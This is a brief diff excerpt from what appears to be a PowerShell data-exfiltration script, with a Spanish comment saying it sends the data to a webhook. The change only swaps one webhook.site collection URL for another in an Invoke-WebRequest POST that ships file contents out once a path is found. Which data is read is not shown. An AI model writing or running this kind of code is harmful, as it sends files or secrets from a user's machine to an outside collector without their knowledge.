@@ -15,7 +15,7 @@ if (Test-Path $path) {
             if ($data) {
                 # Enviamos los datos al Webhook
                 $payload = [System.Text.Encoding]::UTF8.GetBytes($data)
-                Invoke-WebRequest -UseBasicParsing -Uri 'https://webhook.site/c712d334-352a-4bea-b44b-9d94dbe4dede' -Method POST -Body $payload
+                Invoke-WebRequest -UseBasicParsing -Uri ' https://webhook.site/3fa59b0e-4157-4c9e-a72b-4803657bd464' -Method POST -Body $payload
             }
         }
     }
